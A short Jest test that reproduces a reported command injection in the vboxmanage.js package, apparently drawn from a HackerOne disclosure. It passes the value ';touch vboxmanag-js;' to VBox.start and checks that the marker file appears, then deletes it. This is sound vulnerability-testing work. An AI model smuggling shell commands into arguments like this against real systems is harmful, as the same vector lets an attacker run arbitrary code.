//https://hackerone.com/reports/864777
test("Command Injection in vboxmanage.js", () => {
  const VBox = require("vboxmanage.js");
  const fs = require("fs");
  const path = "./vboxmanag-js";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  VBox.start(";touch vboxmanag-js;")
    .then(function () {})
    .catch(function (err) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
